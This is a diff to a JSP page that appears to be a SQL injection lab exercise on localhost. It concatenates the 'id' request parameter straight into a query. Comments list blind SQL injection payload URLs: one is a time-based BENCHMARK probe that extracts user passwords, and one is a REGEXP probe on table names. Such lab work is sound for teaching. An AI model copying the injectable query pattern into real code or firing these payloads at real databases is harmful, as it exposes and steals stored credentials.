@@ -21,7 +21,7 @@ Connection conn = DriverManager.getConnection(connectionUrl, connectionUser, con
 Statement st = conn.createStatement();
 String id = request.getParameter("id");
 String sql = "select id, data from content where id=" + id;
-out.print(sql);
+out.print("<pre>" + sql + "</pre><br>");
 ResultSet result = st.executeQuery(sql);
 
 if (!result.next()) {
@@ -29,7 +29,7 @@ if (!result.next()) {
 } else {
 	String replyID = result.getString("id");
 	String data = result.getString("data");
-	if (data == null && !result.next()) { // || id != replyID) {
+	if (data == null || id != replyID) { //!result.next()) { // || id != replyID) {
 		out.print("error");
 	} else {
 		out.print(data);
@@ -42,7 +42,7 @@ if (!result.next()) {
 // http://localhost:8080/zadanie3/index.jsp?id=0%20UNION%20SELECT%20IF(SUBSTRING(pass,1,1)=%27d%27,BENCHMARK(10000000,SHA1(1)),0),%20pass%20FROM%20users
 
 // Blind SQLi - regexp
-http://localhost:8080/zadanie3/index.jsp?id=0%20UNION%20SELECT%201,2%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%22db%22%20AND%20table_name%20REGEXP%20'^z'LIMIT%200,1
+//http://localhost:8080/zadanie3/index.jsp?id=0%20UNION%20SELECT%201,2%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%22db%22%20AND%20table_name%20REGEXP%20'^z'LIMIT%200,1
 %>
 
 </body>
